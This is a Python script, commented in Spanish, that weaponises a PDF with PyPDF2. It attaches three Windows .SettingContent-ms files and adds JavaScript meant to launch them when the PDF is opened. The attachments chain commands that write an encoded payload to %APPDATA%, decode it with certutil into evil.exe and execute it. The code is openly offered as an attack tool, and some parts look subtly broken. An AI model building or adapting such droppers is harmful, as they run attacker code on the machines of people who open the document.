#!/usr/bin/python
import PyPDF2


def evilinsert(path):

	# crear un objeto de lectura sobre el pdf.
	pdfReader = PyPDF2.PdfFileReader(path)

	# se crea un objeto de escritura sobre el nuevo pdf.
	pdfWriter = PyPDF2.PdfFileWriter()

	# creamos una variable para el numero de paginas.
	numPag = pdfReader.getNumPages()

	# creamos un bucle para anadir las paginas al nuevo pdf.
	for i in range(0,numPag):
		pdfWriter.addPage(pdfReader.getPage(i))

	# uso la clase addJS, para anadir el codigo javascript al PDF, el cual ejecuta los 3
	# arhcivos anteriormente anadidos al abrir el PDF.
	pdfWriter.addJS('var files = ["PutFile.SettingContent-ms", "Decode.SettingContent-ms", "Execute.SettingContent-ms"];for (var i = 0; i < files.len; i++) {	this.exportDataObject({		cName: files[i] + ".SettingContent-ms",		nLaunch: 2,	});}')

	# anadir el modo de la pagina para que muestre los archivos adjuntos.
	pdfWriter.setPageMode("/UseAttachments")

	# utilizamos la clase addAttachment, para anadir al fichero PDF 3 archivos llamados,
	# PutFile.SettingContent-ms, Decode.SettingContent-ms, Execute.SettingContent-ms,
	# el cual su contenido es xml, donde se ejecutaran los comandos maliciosos.
	pdfWriter.addAttachment("PutFile.SettingContent-ms",'<?xml version="1.0" encoding="UTF-8"?><PCSettings><SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"><ApplicationInformation><AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>      <DeepLink>echo YnVmID0gICIiCmJ1ZiArPSAiXHhiZVx4YzlceGNiXHg3MFx4MDVceGRhXHhjYVx4ZDlceDc0XHgyNFx4ZjRceDVmXHgyYiIKYnVmICs9ICJceGM5XHhiMVx4NjFceDgzXHhjN1x4MDRceDMxXHg3N1x4MTFceDAzXHg3N1x4MTFceGUyIgpidWYgKz0gIlx4M2NceDczXHgzMVx4ZmRceDRmXHhmYVx4NjlceDI3XHg3Nlx4NzdceGFhXHgyY1x4ZDIiCmJ1ZiArPSAiXHg0OVx4N2JceDdkXHhiOVx4MmFceDkxXHg4Mlx4MGNceDZmXHg2OFx4NzhceDZkXHg5OSIKYnVmICs9ICJceDY3XHhmNVx4MjlceGI3XHhlNlx4YzdceGIxXHgwZFx4OWJceDIxXHhiMVx4ZWFceGU2IgpidWYgKz0gIlx4OWNceGY4XHgyMlx4M2RceDExXHg1MFx4NWRceGFlXHhkOVx4NWJceGU3XHhjZlx4NjUiCmJ1ZiArPSAiXHhmMlx4NWRceGZiXHhiNVx4N2ZceDkxXHgxOFx4MzZceDFhXHgxMVx4OGFceDNmXHhlYSIKYnVmICs9ICJceGYyXHg1YVx4NzhceDU1XHg4Zlx4ODJceGJlXHg2NVx4YTRceDdjXHg0Zlx4NWZceDhiIgpidWYgKz0gIlx4YjdceDc1XHhlY1x4NzdceDFmXHhiNFx4MmJceDc0XHhhOVx4OGZceDBlXHg1Ylx4NTAiCmJ1ZiArPSAiXHg0Y1x4ZTRceDk4XHgwNVx4ZWFceDc0XHhlMlx4NDBceDZjXHhkN1x4MmNceDQ3XHg5MiIKYnVmICs9ICJceDE4XHg1ZFx4MzFceDdmXHhhZlx4YjZceDM5XHgxOVx4ODRceGQ3XHhkOVx4OWFceDdjIgpidWYgKz0gIlx4YjBceDEyXHhiOFx4OTJceGU0XHg1OFx4MWNceDhmXHhhZlx4N2VceDQxXHhjNVx4ODEiCmJ1ZiArPSAiXHhiOVx4ZjRceDM3XHhiNVx4M2JceDYyXHg4Mlx4ZWVceGE1XHhlM1x4NWVceDdlXHhhNCIKYnVmICs9ICJceGZlXHg5Mlx4ZjVceDIxXHhhMFx4ZjVceGRjXHhjYVx4MzRceGE1XHgyOVx4MWNceDcyIgpidWYgKz0gIlx4NjVceDgzXHgyM1x4YTdceGQ5XHhhY1x4NTdceDUyXHgzMVx4OWVceDBmXHgxMlx4ZjEiCmJ1ZiArPSAiXHgxM1x4YzFceDg4XHg1OFx4MWNceDQzXHhmN1x4MzFceDVjXHg4NFx4MGFceGEwXHg0YyIKYnVmICs9ICJceGRjXHg0NVx4NjJceGVjXHgzZVx4MTlceDg3XHg1Nlx4ZDRceDYxXHg1OVx4M2JceDM0IgpidWYgKz0gIlx4MGRceDIyXHg4OFx4ZmRceDU4XHhkZVx4NzFceDVjXHg2M1x4NTdceDkzXHhkN1x4MTMiCmJ1ZiArPSAiXHg2Y1x4MTBceGYyXHg0NFx4NWNceDM4XHgxNFx4M2RceDkxXHg2Y1x4YjhceDAzXHhjMCIKYnVmICs9ICJceDhlXHhiZFx4YWJceDdlXHhhMFx4MzJceDEwXHgzOVx4MWZceDA3XHg2N1x4ZDFceDQ2IgpidWYgKz0gIlx4YjZceGUzXHg4MVx4NzNceGM2XHhlY1x4OTlceDhhXHgyNlx4ZmZceDNkXHhhZlx4NjUiCmJ1ZiArPSAiXHgxNlx4ZTVceDRiXHgxNVx4YzJceDA5XHg5NVx4OTFceDZjXHhmYlx4OTVceDNhXHgzNCIKYnVmICs9ICJceDg3XHhlYlx4MDZceDJlXHhkOFx4OTNceGY1XHg5MVx4ZTZceGQ5XHhmN1x4MzVceGQ5IgpidWYgKz0gIlx4NzhceDE4XHgzYVx4NGZceDg0XHgwZVx4ODZceGJlXHg0YVx4MjJceDE4XHg1OFx4M2MiCmJ1ZiArPSAiXHg2OFx4YmNceDI5XHhkNVx4YWFceDE2XHgxOFx4ZGJceDBiXHhlNlx4ZTlceDVlXHg4NiIKYnVmICs9ICJceGM5XHgxMlx4NWNceDJlXHgzNlx4ZDNceGJhXHhkOFx4ZDhceDYyXHg3ZFx4ZDNceGQwIgpidWYgKz0gIlx4YWZceGQ1XHg5ZVx4NjFceDFkXHg0M1x4ZmJceDAxXHhkMlx4YjNceGM3XHg5MVx4Y2YiCmJ1ZiArPSAiXHhjNlx4YTFceDlkXHg3Mlx4NzZceDZkXHg2N1x4YjhceDhmXHg1MVx4NzJceDRkXHg3OCIKYnVmICs9ICJceDdiXHg0ZVx4NDdceDZhXHg2Mlx4YzVceDQwXHhkY1x4MzNceDIwXHg1ZFx4MDRceDI2IgpidWYgKz0gIlx4ZGVceGU1XHhhYVx4YzFceDhkXHhjZVx4YmZceGUwXHgwY1x4ZTNceDdmXHhkYVx4OGIiCmJ1ZiArPSAiXHg0ZVx4MGFceGJiXHgxYlx4YjBceDZkXHg2N1x4N2JceGJjXHhiMVx4NjZceDlhXHhmYiIKYnVmICs9ICJceDc5XHg4ZVx4NDRceDA2XHhlY1x4MTdceDFhXHg0ZFx4MTFceGFkXHhmMSIK > %APPDATA%\evil.b64</DeepLink>      <Icon>%windir%\system32\control.exe</Icon>    </ApplicationInformation>    <SettingIdentity>      <PageID></PageID>      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>    </SettingIdentity>    <SettingInformation>      <Description>@shell32.dll,-4161</Description>      <Keywords>@shell32.dll,-4161</Keywords>    </SettingInformation>  </SearchableContent></PCSettings>')
	pdfWriter.addAttachment("Decode.SettingContent-ms",'<?xml version="1.0" encoding="UTF-8"?><PCSettings>  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">    <ApplicationInformation>      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>      <DeepLink>certutil -decode %APPDATA%\evil.b64 %APPDATA%\evil.exe</DeepLink>      <Icon>%windir%\system32\control.exe</Icon>    </ApplicationInformation>    <SettingIdentity>      <PageID></PageID>      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>    </SettingIdentity>    <SettingInformation>      <Description>@shell32.dll,-4161</Description>      <Keywords>@shell32.dll,-4161</Keywords>    </SettingInformation>  </SearchableContent></PCSettings>')
	pdfWriter.addAttachment("Execute.SettingContent-ms",'<?xml version="1.0" encoding="UTF-8"?><PCSettings>  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">    <ApplicationInformation>      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>      <DeepLink>%APPDATA%\evil.exe</DeepLink>      <Icon>%windir%\system32\control.exe</Icon>    </ApplicationInformation>    <SettingIdentity>      <PageID></PageID>      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>    </SettingIdentity>    <SettingInformation>      <Description>@shell32.dll,-4161</Description>      <Keywords>@shell32.dll,-4161</Keywords>    </SettingInformation>  </SearchableContent></PCSettings>')

	with open("newFile.pdf", "wb") as fh:
		pdfWriter.write(fh)

if __name__ == '__main__':
	evilinsert('/root/Escritorio/ejemplo.pdf')
